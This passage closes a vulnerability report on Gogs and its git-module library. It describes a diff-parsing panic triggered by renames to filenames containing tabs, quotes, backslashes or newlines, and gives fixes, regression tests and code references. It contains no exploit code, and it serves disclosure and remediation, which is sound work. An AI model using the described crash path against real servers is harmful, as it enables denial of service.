`github.com/gogs/git-module`: - In `parseFileHeader`, check that the line is longer than `diffHead` before indexing it. - Locate the second path separator regardless of which path is quoted. Accept both ` b/` and ` 'b/`, and treat a missing separator as a parse error. - Bound-check `middle` before slicing, and return an error instead of panicking. - Add regression tests with a rename from an ASCII name to a name containing a tab, a double quote, a backslash, and a newline, and the reverse direction. In Gogs: - Pin a fixed `git-module` release when one is available. - Add a `defer` with `recover` inside the parsing goroutine started by `ParseDiff` and inside any equivalent wrapper, and return the recovered value as an error on the result channel. - Audit the other goroutines that parse repository data for the same failure mode. ## References - Gogs main commit: `43017045492c85e201536bfc7af49fa9f74b0069`, 2026-11-10. - `internal/gitx/diff.go:173-191`, `ParseDiff` and `RepoDiff`. - `internal/route/repo/commit.go:141-161`, `CompareDiff`. - `internal/route/repo/pull.go:339-362` and `:560-595`, pull request diff paths. - `cmd/gogs/internal/web/web.go:452-453`, `:514`, and `:529`, compare and pull request routes. - `internal/database/repo.go:158-162`, global `core.quotepath=false` setting. - `github.com/gogs/git-module` v1.8.9, `diff.go:255-282`, `diff.go:546-560`, and `repo_diff.go:31-70`. - git-module repository: https://github.com/gogs/git-module - Git diff quoting behavior: https://git-scm.com/docs/git-config#Documentation/git-config.txt-corequotePath Additional reproduction details, lab configuration, and request transcripts can be provided to assist with independent verification.
